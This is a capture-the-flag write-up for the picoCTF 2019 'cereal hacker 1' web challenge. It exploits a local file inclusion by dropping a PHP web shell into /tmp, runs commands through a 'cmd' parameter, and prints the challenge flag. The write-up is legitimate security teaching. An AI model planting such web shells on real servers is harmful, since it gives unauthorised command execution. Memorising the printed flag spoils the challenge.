# web / cereal hacker 1

> Points: 450 \
> previous cereal hacker | [next cereal hacker](../cereal-2)

## Question

> Login as admin. <https://2019shell1.picoctf.com/problem/12279/> or <http://2019shell1.picoctf.com:12279>

## Solution

Following the link immediately redirects you to `/index.php?file=login`.
Submitting the form sends a `POST` request to `/index.php?file=login`.
`file` is a suspicious parameter name, so we can test out other "file"s in there.
It turns out that `head`, `foot`, and `admin` are all valid "file"s.

These files must be loading from somewhere, presumably PHP files.
Trying to `GET` any one (for example `/admin.php`) results in the body content of that page (or in the case of `head` and `foot`, the header and footer of the pages).
This is indicative of a Local File Injection (LFI) vulnerability.
If we can get a PHP file somewhere on the server that the webserver can read from, it can execute arbitrary PHP code.
We already have SSH access provided by picoCTF, so we can write to the `/tmp` directory on the server.

```console
retrocraft@pico-2019-shell1:~$ touch /tmp/lfi.php
retrocraft@pico-2019-shell1:~$ echo "hello, world!" > /tmp/lfi.php
```

Bringing up `/index.php?file=/tmp/lfi` shows "hello, world!" onscreen.
We can now step this up a notch by putting what amounts to a reverse shell on the server.

```php
<?php
echo(system($_GET['cmd']));
?>
```

With this, we can request `/index.php?file=/tmp/lfi&cmd=cat%20admin.php`.
In the dump of `admin.php`, we find the flag.

### Flag

`picoCTF{3fba6964d680deb73b38b7f2916df7d5}`
